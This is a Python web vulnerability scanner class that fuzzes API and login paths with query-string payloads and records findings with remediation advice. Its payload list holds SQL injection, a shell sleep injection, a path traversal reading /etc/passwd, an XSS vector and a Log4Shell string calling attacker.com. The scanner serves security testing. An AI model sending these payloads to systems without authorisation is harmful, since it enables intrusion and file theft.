import time
from urllib.parse import urljoin

class APIFuzzer:
    def __init__(self, session, target_url):
        self.session = session
        self.target_url = target_url
        self.test_paths = [
            "/api/v1/user",
            "/api/v1/login",
            "/search",
            "/login",
            "/admin"
        ]
        
        # Burp-style advanced fuzzing payloads
        self.payloads = [
            "' OR 1=1--",
            "\"; sleep 5; \"",
            "../../../etc/passwd",
            "<svg/onload=alert(1)>",
            "${jndi:ldap://attacker.com/a}", # Log4Shell mock
            "{{7*7}}" # SSTI mock
        ]

    def run(self):
        findings = []
        for path in self.test_paths:
            endpoint = urljoin(self.target_url, path)
            for payload in self.payloads:
                # Fuzzing via query parameter
                fuzz_url = f"{endpoint}?id={payload}&q={payload}"
                try:
                    start_time = time.time()
                    resp = self.session.get(fuzz_url, timeout=5)
                    response_time = time.time() - start_time
                    
                    content = resp.text.lower()
                    
                    if "root:x:0:0:" in content:
                        findings.append({
                            "vuln_type": "Path Traversal (LFI)",
                            "severity": "Critical",
                            "path": fuzz_url,
                            "description": "Successfully read /etc/passwd contents via path traversal payload.",
                            "remediation": "Validate and whitelist input. Never pass raw user input to filesystem APIs."
                        })
                        
                    elif "syntax error" in content or "mysql_fetch" in content:
                        findings.append({
                            "vuln_type": "Advanced SQL Injection",
                            "severity": "Critical",
                            "path": fuzz_url,
                            "description": "Error-based SQL Injection confirmed using advanced payload.",
                            "remediation": "Use parameterized queries or ORMs."
                        })
                        
                    elif response_time >= 4.8 and "sleep" in payload:
                        findings.append({
                            "vuln_type": "Command Injection (Blind)",
                            "severity": "Critical",
                            "path": fuzz_url,
                            "description": "Server response was delayed perfectly matching the sleep payload, indicating Command Injection.",
                            "remediation": "Do not pass user input to shell execution environments."
                        })
                        
                    elif "49" in content and "{{7*7}}" in payload:
                        findings.append({
                            "vuln_type": "Server-Side Template Injection (SSTI)",
                            "severity": "High",
                            "path": fuzz_url,
                            "description": "Template engine evaluated mathematical payload (7*7) and returned 49.",
                            "remediation": "Avoid rendering templates from user-supplied strings."
                        })

                except Exception:
                    pass

        # Deduplicate findings
        unique_findings = []
        seen = set()
        for f in findings:
            key = f["vuln_type"] + f["path"]
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
                
        return unique_findings
